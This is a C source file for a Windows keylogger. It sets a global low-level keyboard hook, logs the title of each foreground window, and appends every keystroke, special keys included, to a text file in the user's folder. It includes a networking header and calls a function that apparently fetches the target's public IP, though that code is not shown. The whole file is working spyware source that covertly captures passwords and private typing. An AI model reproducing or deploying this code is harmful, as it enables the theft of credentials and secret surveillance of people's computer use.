#include "main.h"
#include "klogger.h"
#include "net.h"

wchar_t kbtestfile[100];
FILE* kbpFile;
HHOOK kbhook;                                             // handle to keyboard hooking procedure

HWND lastWindow;
wchar_t lastWindowTitle[256];

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLine, INT iCmdShow)
{
	MSG msg;;

	GetTargetUserDirectory(kbtestfile);
	GetTargetPublicIp(kbpFile, kbtestfile);

	if (!(kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0)))
		return 1;

	while (GetMessage(&msg, NULL, 0, 0) != 0);

	UnhookWindowsHookEx(kbhook);

	return 0;
}

void GetTargetUserDirectory(wchar_t kbtestfile[])
{
	wchar_t temp[] = L"C:\\Users\\%USERNAME%\\klog-test.txt";
	ExpandEnvironmentStringsW(temp, kbtestfile, sizeof(temp));
}

LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
{
	_wfopen_s(&kbpFile, kbtestfile, L"a+");

	HWND currentWindow = GetForegroundWindow();
	wchar_t currentWindowTitle[256];
	GetWindowTextW(currentWindow, currentWindowTitle, 256);

	if (wcsncmp(lastWindowTitle, currentWindowTitle, 256)) {
		wchar_t output[256];
		lastWindow = currentWindow;
		wcsncpy_s(lastWindowTitle, 256, currentWindowTitle, sizeof(currentWindowTitle));
		swprintf_s(output, 256, L"[%s]", currentWindowTitle);
		fputws(output, kbpFile);
	}

	if (code >= 0) {
		if (wParam == WM_KEYDOWN) {
			PKBDLLHOOKSTRUCT kbhstruct = (PKBDLLHOOKSTRUCT)lParam;
			DWORD vkey = kbhstruct->vkCode;
			if (vkey == 0x01 || vkey == 0x02)
				;
			// 0x30 to 0x5a define characters (save for a few undefined)
			// 0x60 to 0x69 define numpad keys
			else if (vkey >= 0x30 && vkey <= 0x5a || vkey >= 0x60 && vkey <= 0x69)
			{
				if ((GetKeyState(VK_LSHIFT) & 0x00010000) || (GetKeyState(VK_RSHIFT) & 0x00010000))
				{
					if (isalpha(vkey) && ((GetKeyState(VK_CAPITAL) & 0x00000001) != 1))
						fputc(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR), kbpFile);
					else if (isdigit(vkey))
					{
						switch (vkey)
						{
						case 0x30:
							fputc(')', kbpFile);
							break;
						case 0x31:
							fputc('!', kbpFile);
							break;
						case 0x32:
							fputc('@', kbpFile);
							break;
						case 0x033:
							fputc('#', kbpFile);
							break;
						case 0x34:
							fputc('$', kbpFile);
							break;
						case 0x35:
							fputc('%', kbpFile);
							break;
						case 0x36:
							fputc('^', kbpFile);
							break;
						case 0x37:
							fputc('&', kbpFile);
							break;
						case 0x38:
							fputc('*', kbpFile);
							break;
						case 0x39:
							fputc('(', kbpFile);
							break;
						default:
							break;
						}
					}
				}
				else if ((isalpha(vkey) && (GetKeyState(VK_CAPITAL) & 0x00000001)))
					fputc(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR), kbpFile);
				else
					fputc(tolower(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR)), kbpFile);
			}
			else
			{
				switch (vkey)
				{
				case VK_CANCEL:
					fputs("[ctrl+break]", kbpFile);
					break;
				case VK_MBUTTON:
					fputs("[middle-mouse]", kbpFile);
					break;
				case VK_XBUTTON1:
					fputs("[x1-mouse]", kbpFile);
					break;
				case VK_XBUTTON2:
					fputs("[x2-mouse]", kbpFile);
					break;
				case VK_BACK:
					fputs("[back]", kbpFile);
					break;
				case VK_TAB:
					fputs("[tab]", kbpFile);
					break;
				case VK_CLEAR:
					fputs("[clear]", kbpFile);
					break;
				case VK_RETURN:
					fputs("[enter]", kbpFile);
					break;
				case VK_CONTROL:
					fputs("[ctrl]", kbpFile);
					break;
				case VK_MENU:
					fputs("[alt]", kbpFile);
					break;
				case VK_PAUSE:
					fputs("[pause]", kbpFile);
					break;
				case VK_CAPITAL:
					fputs("[caps]", kbpFile);
					break;
				case VK_KANA:
					fputs("[kana/hangul mode]", kbpFile);
					break;
				case VK_JUNJA:
					fputs("[junja mode]", kbpFile);
					break;
				case VK_FINAL:
					fputs("[final mode]", kbpFile);
					break;
				case VK_HANJA:
					fputs("[kanji/hanja mode]", kbpFile);
					break;
				case VK_ESCAPE:
					fputs("[esc]", kbpFile);
					break;
				case VK_SPACE:
					//fputs("[space]", kbpFile);
					fputs(" ", kbpFile);
					break;
				case VK_PRIOR:
					fputs("[page up]", kbpFile);
					break;
				case VK_NEXT:
					fputs("[page down]", kbpFile);
					break;
				case VK_END:
					fputs("[end]", kbpFile);
					break;
				case VK_HOME:
					fputs("[home]", kbpFile);
					break;
				case VK_LEFT:
					fputs("[left]", kbpFile);
					break;
				case VK_UP:
					fputs("[up]", kbpFile);
					break;
				case VK_RIGHT:
					fputs("[right]", kbpFile);
					break;
				case VK_DOWN:
					fputs("[down]", kbpFile);
					break;
				case VK_SELECT:
					fputs("[select]", kbpFile);
					break;
				case VK_PRINT:
					fputs("[print]", kbpFile);
					break;
				case VK_EXECUTE:
					fputs("[exe]", kbpFile);
					break;
				case VK_SNAPSHOT:
					fputs("[prtsc]", kbpFile);
					break;
				case VK_INSERT:
					fputs("[insert]", kbpFile);
					break;
				case VK_DELETE:
					fputs("[del]", kbpFile);
					break;
				case VK_HELP:
					fputs("[help]", kbpFile);
					break;
				case VK_LWIN:
					fputs("[lwin]", kbpFile);
					break;
				case VK_RWIN:
					fputs("[rwin]", kbpFile);
					break;
				case VK_APPS:
					fputs("[apps]", kbpFile);
					break;
				case VK_SLEEP:
					fputs("[sleep]", kbpFile);
					break;
				case VK_ADD:
					fputs("[add]", kbpFile);
					break;
				case VK_SEPARATOR:
					fputs("[separator]", kbpFile);
					break;
				case VK_SUBTRACT:
					fputs("[sub]", kbpFile);
					break;
				case VK_DECIMAL:
					fputs("[decimal]", kbpFile);
					break;
				case VK_DIVIDE:
					fputs("[slash]", kbpFile);
					break;
				case VK_NUMLOCK:
					fputs("[num]", kbpFile);
					break;
				case VK_SCROLL:
					fputs("[scroll]", kbpFile);
					break;
				case VK_LCONTROL:
					fputs("[lctrl]", kbpFile);
					break;
				case VK_RCONTROL:
					fputs("[rctrl]", kbpFile);
					break;
				case VK_LMENU:
					fputs("[lalt]", kbpFile);
					break;
				case VK_RMENU:
					fputs("[ralt]", kbpFile);
					break;
				/*
				case VK_LSHIFT:
					fputs("[lshift]", kbpFile);
					break;
				case VK_RSHIFT:
					fputs("[rshift]", kbpFile);
					break;
				*/
				case VK_F1:
					fputs("[f1]", kbpFile);
					break;
				case VK_F2:
					fputs("[f2]", kbpFile);
					break;
				case VK_F3:
					fputs("[f3]", kbpFile);
					break;
				case VK_F4:
					fputs("[f4]", kbpFile);
					break;
				case VK_F5:
					fputs("[f5]", kbpFile);
					break;
				case VK_F6:
					fputs("[f6]", kbpFile);
					break;
				case VK_F7:
					fputs("[f7]", kbpFile);
					break;
				case VK_F8:
					fputs("[f8]", kbpFile);
					break;
				case VK_F9:
					fputs("[f9]", kbpFile);
					break;
				case VK_F10:
					fputs("[f10]", kbpFile);
					break;
				case VK_F11:
					fputs("[f11]", kbpFile);
					break;
				case VK_F12:
					fputs("[f12]", kbpFile);
					break;
				case VK_OEM_1:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc(';', kbpFile);
					else fputc(':', kbpFile);
					break;
				case VK_OEM_PLUS:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('+', kbpFile);
					else fputc('=', kbpFile);
					break;
				case VK_OEM_COMMA:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('<', kbpFile);
					else fputc(',', kbpFile);
					break;
				case VK_OEM_MINUS:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('_', kbpFile);
					else fputc('-', kbpFile);
					break;
				case VK_OEM_PERIOD:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('>', kbpFile);
					else fputc('.', kbpFile);
					break;
				// for US standard keyboard
				case VK_OEM_2:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('?', kbpFile);
					else fputc('/', kbpFile);
					break;
				case VK_OEM_3:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('~', kbpFile);
					else fputc('`', kbpFile);
					break;
				case VK_OEM_4:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('{', kbpFile);
					else fputc('[', kbpFile);
					break;
				case VK_OEM_5:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('|', kbpFile);
					else fputc('\\', kbpFile);
					break;
				case VK_OEM_6:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('}', kbpFile);
					else fputc(']', kbpFile);
					break;
				case VK_OEM_7:
					if ((GetKeyState(vkey) & 0x00010000) || (GetKeyState(vkey) & 0x00010000))
						fputc('"', kbpFile);
					else fputc('\'', kbpFile);
					break;
				default:
					break;
				}
			}
		}
	}
	fclose(kbpFile);
	return CallNextHookEx(kbhook, code, wParam, lParam);
}

// Other interesting functions: GetAsyncKeyState(), GetKeyboardLayout(), GetWindowThreadProcessId()
// With a hook, these functions seem unnecessary
//
// THIS IS A TEST STRING.
//
// If we were to use a buffer, we could use sprintf_s/swprintf_s to keep track of the size of the buffer
//
// int j;
// if ((j += swprintf_s(buffer, 140, "%s", vkeyFunc()) >= 140) { // do something }